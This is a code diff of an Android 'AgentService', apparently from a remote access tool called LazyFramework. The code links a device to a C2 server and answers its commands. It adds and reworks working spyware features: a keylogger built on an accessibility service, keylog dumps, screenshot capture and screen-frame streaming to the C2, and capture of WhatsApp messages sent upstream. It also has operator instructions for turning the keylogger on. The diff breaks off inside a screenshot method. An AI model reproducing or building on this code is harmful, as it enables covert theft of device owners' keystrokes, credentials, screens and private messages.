@@ -182,12 +182,12 @@ public class AgentService extends Service {
     private Runnable heartbeatRunnable;
     private ScreenStreamHelper screenStreamHelper;
     private boolean isVideoStreaming = false;
-    
+
     // ==================== KEYLOGGER ====================
     private KeyloggerService keyloggerService;
     private boolean isKeyloggingEnabled = false;
     private BroadcastReceiver keylogReceiver;
-    
+
     // ==================== PENDING DATA QUEUE ====================
     private List<String> pendingDataQueue = new ArrayList<>();
     private static final int MAX_QUEUE_SIZE = 100;
@@ -197,7 +197,7 @@ public class AgentService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        
+
         Log.d(TAG, "🚀 Agent created");
         loadConfig();
 
@@ -256,7 +256,7 @@ public class AgentService extends Service {
     private void registerPermissionReceiver() {
         try {
             unregisterPermissionReceiver();
-            
+
             permissionReceiver = new BroadcastReceiver() {
                 @Override
                 public void onReceive(Context context, Intent intent) {
@@ -264,7 +264,7 @@ public class AgentService extends Service {
                         String type = intent.getStringExtra("type");
                         if ("screen_capture".equals(type)) {
                             Log.d(TAG, "✅ Screen capture permission granted!");
-                            
+
                             MediaProjection projection = ServiceController.getMediaProjection();
                             if (projection != null) {
                                 Log.d(TAG, "✅ MediaProjection available, starting screen mirror...");
@@ -307,7 +307,7 @@ public class AgentService extends Service {
     private void registerKeylogReceiver() {
         try {
             unregisterKeylogReceiver();
-            
+
             keylogReceiver = new BroadcastReceiver() {
                 @Override
                 public void onReceive(Context context, Intent intent) {
@@ -315,7 +315,7 @@ public class AgentService extends Service {
                         String data = intent.getStringExtra("data");
                         if (data != null && !data.isEmpty()) {
                             Log.d(TAG, "📥 Keylog batch received, size: " + data.length());
-                            
+
                             backgroundHandler.post(() -> {
                                 if (isC2Connected()) {
                                     sendRawData(data);
@@ -331,14 +331,14 @@ public class AgentService extends Service {
             };
 
             IntentFilter filter = new IntentFilter("com.lazyframework.KEYLOG_BATCH");
-            
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 registerReceiver(keylogReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
             } else {
                 registerReceiver(keylogReceiver, filter);
             }
             Log.d(TAG, "✅ Keylog receiver registered");
-            
+
         } catch (Exception e) {
             Log.e(TAG, "Register keylog receiver error", e);
         }
@@ -406,7 +406,7 @@ public class AgentService extends Service {
                         }
                     }
                 });
-                
+
                 heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL);
             }
         };
@@ -419,38 +419,38 @@ public class AgentService extends Service {
     private void registerFrameReceiver() {
         try {
             unregisterFrameReceiver();
-            
+
             frameReceiver = new BroadcastReceiver() {
                 @Override
                 public void onReceive(Context context, Intent intent) {
                     if ("com.lazyframework.SCREEN_FRAME".equals(intent.getAction())) {
                         String frameData = intent.getStringExtra("frame_data");
                         int frameNumber = intent.getIntExtra("frame_number", 0);
-                        
+
                         Log.d(TAG, "📨 Frame #" + frameNumber + " received in AgentService");
-                        
+
                         if (frameData == null) {
                             Log.e(TAG, "❌ frameData is null!");
                             return;
                         }
-                        
+
                         backgroundHandler.post(() -> {
                             sendFrameToC2(frameData, frameNumber, intent);
                         });
                     }
                 }
             };
-            
+
             IntentFilter filter = new IntentFilter();
             filter.addAction("com.lazyframework.SCREEN_FRAME");
-            
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 registerReceiver(frameReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
             } else {
                 registerReceiver(frameReceiver, filter);
             }
             Log.d(TAG, "✅ Frame receiver registered");
-            
+
         } catch (Exception e) {
             Log.e(TAG, "Register frame receiver error: " + e.getMessage(), e);
         }
@@ -467,64 +467,21 @@ public class AgentService extends Service {
         }
     }
 
-    private void sendFrameToC2(String frameData, int frameNumber, Intent intent) {
-        try {
-            Log.d(TAG, "📤 Sending frame #" + frameNumber + " to C2 (background)");
-            
-            if (!isC2Connected()) {
-                Log.w(TAG, "⚠️ Not connected to C2, queuing frame...");
-                try {
-                    JSONObject json = new JSONObject();
-                    json.put("type", "response");
-                    json.put("agent_id", getAgentId());
-                    json.put("command", "SCREEN_FRAME");
-                    
-                    JSONObject result = new JSONObject();
-                    result.put("type", "screen_frame");
-                    result.put("width", intent.getIntExtra("width", 0));
-                    result.put("height", intent.getIntExtra("height", 0));
-                    result.put("data", frameData);
-                    result.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));
-                    result.put("frame_number", frameNumber);
-                    
-                    json.put("result", result);
-                    queueDataForReconnect(json.toString());
-                } catch (Exception e) {
-                    Log.e(TAG, "Queue frame error: " + e.getMessage());
-                }
-                return;
-            }
-            
-            JSONObject json = new JSONObject();
-            json.put("type", "response");
-            json.put("agent_id", getAgentId());
-            json.put("command", "SCREEN_FRAME");
-            
-            JSONObject result = new JSONObject();
-            result.put("type", "screen_frame");
-            result.put("width", intent.getIntExtra("width", 0));
-            result.put("height", intent.getIntExtra("height", 0));
-            result.put("data", frameData);
-            result.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));
-            result.put("frame_number", frameNumber);
-            
-            json.put("result", result);
-            String jsonString = json.toString();
-            
-            synchronized (out) {
-                out.println(jsonString);
-                out.flush();
-                Log.d(TAG, "✅ Frame #" + frameNumber + " forwarded to C2!");
-            }
-            
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Frame forward error: " + e.getMessage(), e);
+    // AgentService.java - Ganti method sendFrameToC2
+
+private void sendFrameToC2(String frameData, int frameNumber, Intent intent) {
+    try {
+        Log.d(TAG, "📤 Sending frame #" + frameNumber + " to C2");
+
+        // ✅ CEK KONEKSI
+        if (!isC2Connected()) {
+            Log.w(TAG, "⚠️ Not connected to C2, queuing frame #" + frameNumber);
             try {
                 JSONObject json = new JSONObject();
                 json.put("type", "response");
                 json.put("agent_id", getAgentId());
                 json.put("command", "SCREEN_FRAME");
-                
+
                 JSONObject result = new JSONObject();
                 result.put("type", "screen_frame");
                 result.put("width", intent.getIntExtra("width", 0));
@@ -532,14 +489,62 @@ public class AgentService extends Service {
                 result.put("data", frameData);
                 result.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));
                 result.put("frame_number", frameNumber);
-                
+
                 json.put("result", result);
                 queueDataForReconnect(json.toString());
-            } catch (Exception qe) {
-                Log.e(TAG, "Queue on error: " + qe.getMessage());
+            } catch (Exception e) {
+                Log.e(TAG, "Queue frame error: " + e.getMessage());
             }
+            return;
+        }
+
+        // ✅ KIRIM KE C2
+        JSONObject json = new JSONObject();
+        json.put("type", "response");
+        json.put("agent_id", getAgentId());
+        json.put("command", "SCREEN_FRAME");
+
+        JSONObject result = new JSONObject();
+        result.put("type", "screen_frame");
+        result.put("width", intent.getIntExtra("width", 0));
+        result.put("height", intent.getIntExtra("height", 0));
+        result.put("data", frameData);
+        result.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));
+        result.put("frame_number", frameNumber);
+
+        json.put("result", result);
+        String jsonString = json.toString();
+
+        // ✅ KIRIM
+        synchronized (out) {
+            out.println(jsonString);
+            out.flush();
+            Log.d(TAG, "✅ Frame #" + frameNumber + " forwarded to C2! Size: " + frameData.length());
+        }
+
+    } catch (Exception e) {
+        Log.e(TAG, "❌ Frame forward error: " + e.getMessage(), e);
+        try {
+            JSONObject json = new JSONObject();
+            json.put("type", "response");
+            json.put("agent_id", getAgentId());
+            json.put("command", "SCREEN_FRAME");
+
+            JSONObject result = new JSONObject();
+            result.put("type", "screen_frame");
+            result.put("width", intent.getIntExtra("width", 0));
+            result.put("height", intent.getIntExtra("height", 0));
+            result.put("data", frameData);
+            result.put("timestamp", intent.getLongExtra("timestamp", System.currentTimeMillis()));
+            result.put("frame_number", frameNumber);
+
+            json.put("result", result);
+            queueDataForReconnect(json.toString());
+        } catch (Exception qe) {
+            Log.e(TAG, "Queue on error: " + qe.getMessage());
         }
     }
+}
 
     // ==================== NOTIFICATION ====================
 
@@ -880,13 +885,13 @@ public class AgentService extends Service {
                 String line;
                 int consecutiveErrors = 0;
                 final int MAX_CONSECUTIVE_ERRORS = 5;
-                
+
                 while (isRunning.get() && isConnected.get()) {
                     try {
                         if (socket != null) {
                             socket.setSoTimeout(30000);
                         }
-                        
+
                         line = in.readLine();
                         if (line == null) {
                             Log.w(TAG, "⚠️ Connection closed by server");
@@ -919,7 +924,7 @@ public class AgentService extends Service {
                                     Log.d(TAG, "✅ Server acknowledgment received");
                                     return;
                                 }
-                                
+
                                 String result = executeCommand(currentLine);
                                 if (result != null && !result.isEmpty()) {
                                     sendResponse(currentLine, result);
@@ -935,12 +940,12 @@ public class AgentService extends Service {
                     } catch (Exception e) {
                         Log.e(TAG, "❌ Read error: " + e.getMessage());
                         consecutiveErrors++;
-                        
+
                         if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {
                             Log.e(TAG, "❌ Too many consecutive errors, breaking");
                             break;
                         }
-                        
+
                         try {
                             Thread.sleep(1000);
                         } catch (InterruptedException ignored) {}
@@ -1051,10 +1056,10 @@ public class AgentService extends Service {
             Intent intent = new Intent(this, MainActivity.class);
             intent.putExtra("action", "request_mirror_permission");
             intent.putExtra("agent_id", getAgentId());
-            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
-                            Intent.FLAG_ACTIVITY_CLEAR_TOP |
-                            Intent.FLAG_ACTIVITY_SINGLE_TOP);
-            
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
+                    Intent.FLAG_ACTIVITY_CLEAR_TOP |
+                    Intent.FLAG_ACTIVITY_SINGLE_TOP);
+
             try {
                 startActivity(intent);
                 Log.d(TAG, "✅ MainActivity started");
@@ -1073,9 +1078,9 @@ public class AgentService extends Service {
                         System.currentTimeMillis() - mirrorRequestTime > MIRROR_TIMEOUT) {
                     isMirrorRequestPending = false;
                     Log.w(TAG, "⚠️ Mirror permission request timeout");
-                    
+
                     showToast("⚠️ Screen mirror permission timed out");
-                    
+
                     try {
                         JSONObject result = new JSONObject();
                         result.put("status", "timeout");
@@ -1172,7 +1177,7 @@ public class AgentService extends Service {
             return errorJson(e.getMessage());
         }
     }
-    
+
     public void sendMirrorStatus(boolean active) {
         try {
             JSONObject status = new JSONObject();
@@ -1180,7 +1185,7 @@ public class AgentService extends Service {
             status.put("agent_id", getAgentId());
             status.put("mirror_active", active);
             status.put("timestamp", System.currentTimeMillis());
-            
+
             if (out != null && isConnected.get()) {
                 synchronized (out) {
                     out.println(status.toString());
@@ -1303,16 +1308,41 @@ public class AgentService extends Service {
                 case "KEYLOG_START":
                     ServiceController.executeOnKeylogger(service -> service.startLogging());
                     return successJson("Keylogger started");
-                    
+
                 case "KEYLOG_STOP":
                     ServiceController.executeOnKeylogger(service -> service.stopLogging());
                     return successJson("Keylogger stopped");
-                    
+
                 case "KEYLOG_STATUS":
                     return getKeyloggerStatus();
-                    
+
                 case "KEYLOG_DUMP":
-                    return dumpKeylogs();
+    String logs = "KeyloggerService not found";
+    int count = 0;
+    boolean isLogging = false;
+    int queueSize = 0;
+    int historySize = 0;
+
+    KeyloggerService kls = ServiceController.getKeyloggerService();
+    if (kls != null) {
+        logs = kls.getLogs();
+        count = kls.getTotalKeystrokesLogged();
+        isLogging = kls.isLogging();
+        queueSize = kls.getQueueSize();
+        historySize = kls.getHistorySize();
+    }
+
+    JSONObject result = new JSONObject();
+    result.put("status", "success");
+    result.put("type", "keylog_dump");
+    result.put("logs", logs);
+    result.put("count", count);
+    result.put("is_logging", isLogging);
+    result.put("queue_size", queueSize);
+    result.put("history_size", historySize);
+    result.put("timestamp", System.currentTimeMillis());
+
+    return result.toString();
                 case "VIDEO_STREAM_START":
                     return startVideoStream();
                 case "VIDEO_STREAM_STOP":
@@ -1336,7 +1366,7 @@ public class AgentService extends Service {
             return errorJson(e.getMessage());
         }
     }
-    
+
     // ==================== VIDEO STREAM ====================
 
     private String startVideoStream() {
@@ -1344,25 +1374,25 @@ public class AgentService extends Service {
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                 return errorJson("Video streaming requires Android 5.0+");
             }
-            
+
             if (screenStreamHelper != null && screenStreamHelper.isStreaming()) {
                 return successJson("Video stream already active");
             }
-            
+
             Intent intent = new Intent(this, MainActivity.class);
             intent.putExtra("action", "request_stream_permission");
             intent.putExtra("agent_id", getAgentId());
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
             startActivity(intent);
-            
+
             isVideoStreaming = true;
-            
+
             JSONObject result = new JSONObject();
             result.put("status", "pending");
             result.put("message", "Video stream permission requested");
             result.put("type", "video_stream");
             return result.toString();
-            
+
         } catch (Exception e) {
             Log.e(TAG, "Start video stream error: " + e.getMessage());
             return errorJson(e.getMessage());
@@ -1410,7 +1440,7 @@ public class AgentService extends Service {
         }
         return false;
     }
-    
+
     private void requestCameraPermission() {
         mainHandler.post(() -> {
             Toast.makeText(this, "❌ Please grant Camera permission in App Settings", Toast.LENGTH_LONG).show();
@@ -2012,12 +2042,12 @@ public class AgentService extends Service {
 
     public void onWhatsAppMessageCaptured(String appName, String sender, String message, String timestamp) {
         if (!isWhatsAppCapturing) return;
-        
+
         synchronized (whatsappMessages) {
             String entry = String.format("[%s] %s - %s: %s\n",
                     timestamp, appName, sender, message);
             whatsappMessages.append(entry);
-            
+
             if (whatsappMessages.length() > MAX_WA_MESSAGES * 100) {
                 int cutIndex = whatsappMessages.indexOf("\n", whatsappMessages.length() / 2);
                 if (cutIndex > 0) {
@@ -2025,27 +2055,27 @@ public class AgentService extends Service {
                 }
             }
         }
-        
+
         sendWhatsAppMessageToC2(appName, sender, message, timestamp);
     }
 
     private void sendWhatsAppMessageToC2(String appName, String sender, String message, String timestamp) {
         if (out == null || !isConnected.get()) return;
-        
+
         try {
             JSONObject json = new JSONObject();
             json.put("type", "whatsapp_message");
             json.put("agent_id", getAgentId());
-            
+
             JSONObject data = new JSONObject();
             data.put("app_name", appName);
             data.put("sender", sender);
             data.put("message", message);
             data.put("timestamp", timestamp);
             data.put("time_ms", System.currentTimeMillis());
-            
+
             json.put("data", data);
-            
+
             synchronized (out) {
                 out.println(json.toString());
                 out.flush();
@@ -2670,19 +2700,19 @@ public class AgentService extends Service {
     private String startKeylogger() {
         try {
             Log.d(TAG, "📤 START_KEYLOGGER command received");
-            
+
             KeyloggerService service = ServiceController.getKeyloggerService();
-            
+
             if (service == null) {
                 Log.w(TAG, "⚠️ KeyloggerService not registered in ServiceController");
-                
+
                 Intent intent = new Intent(this, KeyloggerService.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForegroundService(intent);
                 } else {
                     startService(intent);
                 }
-                
+
                 int retryCount = 0;
                 while (retryCount < 10 && service == null) {
                     Thread.sleep(500);
@@ -2690,10 +2720,10 @@ public class AgentService extends Service {
                     retryCount++;
                     Log.d(TAG, "⏳ Waiting for KeyloggerService... attempt " + retryCount);
                 }
-                
+
                 if (service == null) {
                     Log.e(TAG, "❌ KeyloggerService still null after " + retryCount + " attempts");
-                    
+
                     JSONObject result = new JSONObject();
                     result.put("status", "error");
                     result.put("message", "Keylogger service not available. Please enable Accessibility permission.");
@@ -2702,10 +2732,10 @@ public class AgentService extends Service {
                     return result.toString();
                 }
             }
-            
+
             service.startLogging();
             isKeyloggingEnabled = true;
-            
+
             JSONObject result = new JSONObject();
             result.put("status", "success");
             result.put("message", "Keylogger started");
@@ -2713,10 +2743,10 @@ public class AgentService extends Service {
             result.put("is_logging", service.isLogging());
             result.put("total_keystrokes", service.getTotalKeystrokesLogged());
             result.put("queue_size", service.getQueueSize());
-            
+
             Log.d(TAG, "✅ Keylogger started. Service connected: true");
             return result.toString();
-            
+
         } catch (Exception e) {
             Log.e(TAG, "Start keylogger error: " + e.getMessage(), e);
             return errorJson("Failed to start keylogger: " + e.getMessage());
@@ -2726,9 +2756,9 @@ public class AgentService extends Service {
     private String stopKeylogger() {
         try {
             Log.d(TAG, "📤 STOP_KEYLOGGER command received");
-            
+
             KeyloggerService service = ServiceController.getKeyloggerService();
-            
+
             if (service != null) {
                 service.stopLogging();
                 isKeyloggingEnabled = false;
@@ -2736,51 +2766,129 @@ public class AgentService extends Service {
             } else {
                 Log.w(TAG, "⚠️ KeyloggerService not available");
             }
-            
+
             JSONObject result = new JSONObject();
             result.put("status", "success");
             result.put("message", "Keylogger stopped");
             result.put("keystrokes_captured", service != null ? service.getTotalKeystrokesLogged() : 0);
             return result.toString();
-            
+
         } catch (Exception e) {
             Log.e(TAG, "Stop keylogger error: " + e.getMessage());
             return errorJson(e.getMessage());
         }
     }
 
-    private String dumpKeylogs() {
-        try {
-            Log.d(TAG, "📤 DUMP_KEYLOGS command received");
+    // AgentService.java - GANTI method dumpKeylogs()
+
+private String dumpKeylogs() {
+    try {
+        Log.d(TAG, "📤 DUMP_KEYLOGS command received");
+
+        KeyloggerService service = ServiceController.getKeyloggerService();
+        
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("type", "keylog_dump");
+        result.put("timestamp", System.currentTimeMillis());
+
+        if (service != null) {
+            // ✅ CEK APAKAH LOGGING AKTIF
+            if (!service.isLogging()) {
+                Log.w(TAG, "⚠️ Keylogger is not logging, starting...");
+                service.startLogging();
+                Thread.sleep(500);
+            }
             
-            KeyloggerService service = ServiceController.getKeyloggerService();
+            String logs = service.getLogs();
             
-            JSONObject result = new JSONObject();
-            result.put("status", "success");
-            result.put("type", "keylog_dump");
-            result.put("timestamp", System.currentTimeMillis());
+            // ✅ PASTIKAN LOGS TIDAK NULL
+            if (logs == null || logs.isEmpty()) {
+                logs = "No keylogs captured yet.\n\n" +
+                       "📋 DEBUG INFO:\n" +
+                       "  - Service running: " + service.isLogging() + "\n" +
+                       "  - Total keystrokes: " + service.getTotalKeystrokesLogged() + "\n" +
+                       "  - Queue size: " + service.getQueueSize() + "\n" +
+                       "  - History size: " + service.getHistorySize() + "\n\n" +
+                       "💡 TROUBLESHOOTING:\n" +
+                       "  1. Go to Settings → Accessibility\n" +
+                       "  2. Find 'LazyFramework Keylogger'\n" +
+                       "  3. ENABLE the service\n" +
+                       "  4. Type something in any app\n" +
+                       "  5. Run KEYLOG_DUMP again";
+            }
+            
+            // ✅ TAMBAHKAN SEMUA DATA KE RESULT
+            result.put("logs", logs);
+            result.put("count", service.getTotalKeystrokesLogged());
+            result.put("queue_size", service.getQueueSize());
+            result.put("history_size", service.getHistorySize());
+            result.put("is_logging", service.isLogging());
+            result.put("service_connected", true);
+            
+            Log.d(TAG, "📤 Keylog dump result: " + (logs != null ? logs.length() : 0) + " chars");
+            
+        } else {
+            // ✅ FALLBACK: RESTART SERVICE
+            Log.w(TAG, "⚠️ KeyloggerService not available, attempting to restart...");
+            
+            Intent intent = new Intent(this, KeyloggerService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent);
+            } else {
+                startService(intent);
+            }
+            
+            int maxRetries = 10;
+            int retryCount = 0;
+            
+            while (retryCount < maxRetries && service == null) {
+                Thread.sleep(500);
+                service = ServiceController.getKeyloggerService();
+                retryCount++;
+                Log.d(TAG, "⏳ Waiting for KeyloggerService... attempt " + retryCount + "/" + maxRetries);
+            }
             
             if (service != null) {
                 String logs = service.getLogs();
-                result.put("logs", logs != null ? logs : "No keylogs captured yet");
+                if (logs == null || logs.isEmpty()) {
+                    logs = "✅ Service restarted successfully!\n" +
+                           "   Type something and run KEYLOG_DUMP again.";
+                }
+                result.put("logs", logs);
                 result.put("count", service.getTotalKeystrokesLogged());
                 result.put("queue_size", service.getQueueSize());
+                result.put("history_size", service.getHistorySize());
                 result.put("is_logging", service.isLogging());
-                
-                Log.d(TAG, "📤 Keylog dump: " + (logs != null ? logs.length() : 0) + " chars");
+                result.put("service_connected", true);
+                result.put("restarted", true);
+                Log.d(TAG, "📤 Keylog dump after restart: " + (logs != null ? logs.length() : 0) + " chars");
             } else {
-                result.put("logs", "KeyloggerService not available. Please enable Accessibility Service.");
+                String errorMsg = "❌ KeyloggerService not available.\n\n" +
+                           "📋 TROUBLESHOOTING:\n" +
+                           "  1. Go to Settings → Accessibility\n" +
+                           "  2. Find 'LazyFramework Keylogger'\n" +
+                           "  3. ENABLE the service\n" +
+                           "  4. Run KEYLOG_START\n" +
+                           "  5. Type something\n" +
+                           "  6. Run KEYLOG_DUMP again";
+                result.put("logs", errorMsg);
+                result.put("service_connected", false);
                 result.put("message", "Service unavailable");
-                result.put("instruction", "Go to Settings > Accessibility > LazyFramework Keylogger > Enable");
+                result.put("instruction", "Enable Accessibility Service in Settings");
             }
-            
-            return result.toString();
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Dump keylogs error: " + e.getMessage(), e);
-            return errorJson("Failed to dump keylogs: " + e.getMessage());
         }
+
+        // ✅ KEMBALIKAN RESULT SEBAGAI JSON STRING
+        String resultString = result.toString();
+        Log.d(TAG, "📤 DUMP_KEYLOGS result: " + resultString.substring(0, Math.min(200, resultString.length())));
+        return resultString;
+
+    } catch (Exception e) {
+        Log.e(TAG, "Dump keylogs error: " + e.getMessage(), e);
+        return errorJson("Failed to dump keylogs: " + e.getMessage());
     }
+}
 
     private String getKeyloggerStatus() {
         try {
@@ -2788,7 +2896,7 @@ public class AgentService extends Service {
             JSONObject result = new JSONObject();
             result.put("status", "success");
             result.put("type", "keylogger_status");
-            
+
             if (keylogger != null) {
                 result.put("is_logging", keylogger.isLogging());
                 result.put("total_keystrokes", keylogger.getTotalKeystrokesLogged());
@@ -2797,7 +2905,7 @@ public class AgentService extends Service {
                 result.put("is_logging", false);
                 result.put("error", "KeyloggerService not available");
             }
-            
+
             result.put("timestamp", System.currentTimeMillis());
             return result.toString();
         } catch (Exception e) {
@@ -3024,129 +3132,204 @@ public class AgentService extends Service {
 
     // ==================== SCREENSHOT - FIXED ====================
 
-    private String captureScreenshot() {
-        try {
-            Log.d(TAG, "📸 Starting screenshot capture...");
+    // AgentService.java - Ganti captureScreenshot()
 
-            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-                if (!hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)) {
-                    JSONObject result = new JSONObject();
-                    result.put("status", "permission_denied");
-                    result.put("permission", "READ_EXTERNAL_STORAGE");
-                    return result.toString();
-                }
+private String captureScreenshot() throws JSONException {
+    try {
+        Log.d(TAG, "📸 Starting screenshot capture...");
+
+        // ✅ PRIORITAS: Ambil dari ScreenMirrorHelper jika aktif
+        ScreenMirrorHelper helper = ServiceController.getScreenMirrorHelper();
+        
+        if (helper != null && helper.isCapturing()) {
+            // TAMBAHKAN METHOD getLastFrame() di ScreenMirrorHelper
+            Bitmap frame = helper.getLastFrame();
+            if (frame != null) {
+                Log.d(TAG, "✅ Screenshot from active mirror: " + frame.getWidth() + "x" + frame.getHeight());
+                return processScreenshot(frame);
             }
-
-            Bitmap screenshot = null;
-
-            // ✅ METHOD 1: MediaProjection (PRIORITAS UTAMA)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                MediaProjection projection = ServiceController.getMediaProjection();
-                
-                if (projection == null) {
-                    Log.w(TAG, "⚠️ MediaProjection null, requesting permission...");
-                    requestMediaProjectionPermission();
-                    
-                    int wait = 0;
-                    while (projection == null && wait < 5000) {
-                        Thread.sleep(500);
-                        projection = ServiceController.getMediaProjection();
-                        wait += 500;
-                    }
-                }
-                
-                if (projection != null) {
-                    screenshot = takeScreenshotWithMediaProjection(projection);
-                    if (screenshot != null && !isAllWhite(screenshot)) {
-                        Log.d(TAG, "✅ Screenshot via MediaProjection: " + screenshot.getWidth() + "x" + screenshot.getHeight());
-                        return processScreenshot(screenshot);
-                    }
-                    if (screenshot != null) screenshot.recycle();
-                }
-            }
-
-            // ✅ METHOD 2: View-based (FALLBACK)
-            screenshot = takeScreenshotViaView();
-            if (screenshot != null && !isAllWhite(screenshot)) {
-                Log.d(TAG, "✅ Screenshot via View");
-                return processScreenshot(screenshot);
-            }
-            if (screenshot != null) screenshot.recycle();
-
-            // ✅ METHOD 3: Canvas-based (LAST RESORT)
-            screenshot = takeScreenshotViaCanvas();
-            if (screenshot != null) {
-                Log.d(TAG, "✅ Screenshot via Canvas");
-                return processScreenshot(screenshot);
-            }
-
-            return errorJson("Failed to capture screenshot");
-
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Screenshot error: " + e.getMessage(), e);
-            return errorJson(e.getMessage());
+            Log.w(TAG, "⚠️ Mirror active but no frame available");
         }
+
+        // FALLBACK: Coba MediaProjection
+        MediaProjection projection = ServiceController.getMediaProjection();
+
+        if (projection == null) {
+            Log.w(TAG, "⚠️ MediaProjection NULL - requesting permission...");
+
+            Intent intent = new Intent(this, MainActivity.class);
+            intent.putExtra("action", "request_screenshot_permission");
+            intent.putExtra("agent_id", getAgentId());
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            startActivity(intent);
+
+            int waitCount = 0;
+            int maxWait = 20;
+            while (projection == null && waitCount < maxWait) {
+                Thread.sleep(500);
+                projection = ServiceController.getMediaProjection();
+                waitCount++;
+                Log.d(TAG, "⏳ Waiting for projection... " + waitCount + "/" + maxWait);
+            }
+        }
+
+        if (projection == null) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Screen recording permission not granted!");
+            result.put("instruction", "Please run SCREEN_START first to grant permission.");
+            return result.toString();
+        }
+
+        Log.d(TAG, "✅ MediaProjection available, capturing...");
+        Bitmap screenshot = takeScreenshotWithMediaProjection(projection);
+
+        if (screenshot == null) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Failed to capture screen image");
+            return result.toString();
+        }
+
+        Log.d(TAG, "✅ Screenshot captured: " + screenshot.getWidth() + "x" + screenshot.getHeight());
+        return processScreenshot(screenshot);
+
+    } catch (Exception e) {
+        Log.e(TAG, "❌ Screenshot error: " + e.getMessage(), e);
+        JSONObject result = new JSONObject();
+        result.put("status", "error");
+        result.put("message", e.getMessage());
+        return result.toString();
+    }
+}
+
+    // ✅ TAMBAHKAN VERSI SIMPLIFIED - SCREENSHOT DENGAN MEDIAPROJECTION
+    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+private Bitmap takeScreenshotWithMediaProjection(MediaProjection projection) {
+    if (projection == null) {
+        Log.e(TAG, "❌ Projection is null!");
+        return null;
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
-    private Bitmap takeScreenshotWithMediaProjection(MediaProjection projection) {
-        if (projection == null) return null;
+    ImageReader reader = null;
+    VirtualDisplay virtualDisplay = null;
 
-        ImageReader reader = null;
-        VirtualDisplay virtualDisplay = null;
-        
-        try {
-            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-            if (wm == null) return null;
+    try {
+        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+        if (wm == null) {
+            Log.e(TAG, "❌ WindowManager null");
+            return null;
+        }
 
-            DisplayMetrics metrics = new DisplayMetrics();
-            wm.getDefaultDisplay().getMetrics(metrics);
+        DisplayMetrics metrics = new DisplayMetrics();
+        wm.getDefaultDisplay().getMetrics(metrics);
 
-            int width = metrics.widthPixels;
-            int height = metrics.heightPixels;
-            int density = metrics.densityDpi;
+        int width = metrics.widthPixels;
+        int height = metrics.heightPixels;
+        int density = metrics.densityDpi;
 
-            Log.d(TAG, "📱 Screen: " + width + "x" + height + " @ " + density + "dpi");
+        Log.d(TAG, "📱 Screen: " + width + "x" + height + " @ " + density + "dpi");
 
-            reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
-            
-            virtualDisplay = projection.createVirtualDisplay(
-                "Screenshot",
+        reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+
+        // ✅ GUNAKAN VIRTUAL_DISPLAY_FLAG_PUBLIC agar bisa diakses
+        virtualDisplay = projection.createVirtualDisplay(
+                "LazyScreenshot_" + System.currentTimeMillis(), // NAMA UNIK
                 width, height, density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR | 
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
                 reader.getSurface(),
                 null, null
-            );
+        );
 
-            Bitmap bitmap = null;
-            int retries = 0;
-            while (retries < 10) {
-                Thread.sleep(300);
-                
-                Image image = reader.acquireLatestImage();
-                if (image != null) {
-                    bitmap = imageToBitmap(image);
-                    image.close();
-                    if (bitmap != null) break;
-                }
-                retries++;
-                Log.d(TAG, "⏳ Waiting for screenshot frame... attempt " + (retries + 1));
-            }
+        // ✅ TUNGGU LEBIH LAMA
+        Bitmap bitmap = null;
+        Image image = null;
 
-            return bitmap;
+        for (int i = 0; i < 20; i++) {
+            Thread.sleep(200);
+            image = reader.acquireLatestImage();
+            if (image != null) {
+                Log.d(TAG, "✅ Image acquired at attempt " + (i + 1));
+                bitmap = convertImageToBitmap(image);
+                image.close();
+                if (bitmap != null) break;
+            }
+            Log.d(TAG, "⏳ Waiting for image... " + (i + 1) + "/20");
+        }
 
-        } catch (Exception e) {
-            Log.e(TAG, "MediaProjection screenshot error: " + e.getMessage(), e);
-            return null;
-        } finally {
-            if (virtualDisplay != null) {
-                try { virtualDisplay.release(); } catch (Exception e) {}
-            }
-            if (reader != null) {
-                try { reader.close(); } catch (Exception e) {}
-            }
+        return bitmap;
+
+    } catch (Exception e) {
+        Log.e(TAG, "❌ Screenshot error: " + e.getMessage(), e);
+        return null;
+    } finally {
+        // ✅ RELEASE VIRTUALDISPLAY SETELAH SCREENSHOT
+        if (virtualDisplay != null) {
+            try { 
